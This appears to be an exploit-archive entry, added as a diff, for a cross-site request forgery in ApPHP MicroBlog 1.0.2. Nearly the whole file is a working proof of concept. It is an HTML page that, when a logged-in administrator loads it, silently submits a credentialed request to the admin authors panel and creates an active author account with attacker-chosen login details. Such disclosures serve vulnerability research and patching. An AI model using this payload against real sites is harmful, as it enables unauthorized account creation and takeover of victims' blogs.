@@ -1,0 +1,155 @@
+# Exploit Title :              ApPHP MicroBlog 1.0.2  - Cross-Site Request Forgery  (Add New Author)
+# Author :                      Besim
+# Google Dork :
+# Date :                         12/10/2016
+# Type :                         webapps
+# Platform :                    PHP
+# Vendor Homepage :   -
+# Software link :            http://www.scriptdungeon.com/jump.php?ScriptID=9162
+
+
+
+########################### CSRF PoC ###############################
+
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "
+http://site_name/path/index.php?admin=authors_management", true);
+        xhr.setRequestHeader("Accept",
+"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data;
+boundary=---------------------------25472311920733601781889948655");
+        xhr.withCredentials = true;
+        var body =
+"-----------------------------25472311920733601781889948655\r\n" +
+          "Content-Disposition: form-data; name=\"mg_action\"\r\n" +
+          "\r\n" +
+          "create\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_rid\"\r\n" +
+          "\r\n" +
+          "-1\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_sorting_fields\"\r\n"
++
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_sorting_types\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_page\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_operation\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_operation_type\"\r\n"
++
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_operation_field\"\r\n"
++
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_search_status\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"mg_language_id\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"show_about_me\"\r\n" +
+          "\r\n" +
+          "0\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"account_type\"\r\n" +
+          "\r\n" +
+          "author\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"last_login\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"first_name\"\r\n" +
+          "\r\n" +
+          "Mehmet\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"last_name\"\r\n" +
+          "\r\n" +
+          "mersin\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"email\"\r\n" +
+          "\r\n" +
+          "mehmet@yopmail.com\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"user_name\"\r\n" +
+          "\r\n" +
+          "Zer0\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"password\"\r\n" +
+          "\r\n" +
+          "mehmet\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"avatar\";
+filename=\"\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"about_me\"\r\n" +
+          "\r\n" +
+          "denemddendemdendjendk\r\n" +
+          "-----------------------------25472311920733601781889948655\r\n"
++
+          "Content-Disposition: form-data; name=\"is_active\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+
+"-----------------------------25472311920733601781889948655--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request"
+onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+####################################################################
